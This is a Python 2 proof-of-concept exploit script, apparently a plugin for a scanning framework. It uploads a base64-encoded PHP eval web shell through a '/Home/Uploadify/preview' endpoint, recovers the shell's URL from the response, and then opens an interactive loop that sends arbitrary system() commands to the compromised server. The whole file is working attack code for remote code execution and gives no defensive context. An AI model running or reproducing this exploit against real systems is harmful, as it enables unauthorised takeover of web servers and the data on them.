# -*- encoding:"utf-8"-*-
from lib.core.data import target
import urlparse
import requests
import base64
import json
import re


def poc():
    try:
        if not target.url.endswith("index.php"):
            print("[*] Please make sure the url end with 'index.php'")
            exit()
        url1 = target.url + "/Home/Uploadify/preview"
        password = raw_input("[*] Please enter the shell-password:")
        phpshell = "<?php eval($_POST['%s']);?>" % password
        postData = "data:image/php;base64,%s" % base64.b64encode(phpshell)
        r = requests.post(url1, data=postData)
        # print r.encoding
        p = re.compile("(?<=preview\/)(.*)(php)")
        shellName = re.search(p, json.loads(r.text)['result']).group(0)
        shell = target.url.replace("index.php", "preview/") + shellName
        print("[*] The shell url: " + shell)
        print("[*] The shell password: " + password)

        while 1:
            try:
                command = raw_input("[*] input the command:")
                payload = 'system("%s");' % command
                if command != "exit":
                    postData = {
                        password: payload
                    }
                    r = requests.post(shell, data=postData)
                    print(r.text.encode(r.encoding))
                else:
                    break
            except EOFError as e:
                print("[*] type 'exit' to quit")
                pass
    except (KeyError, IndexError) as e:
        print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
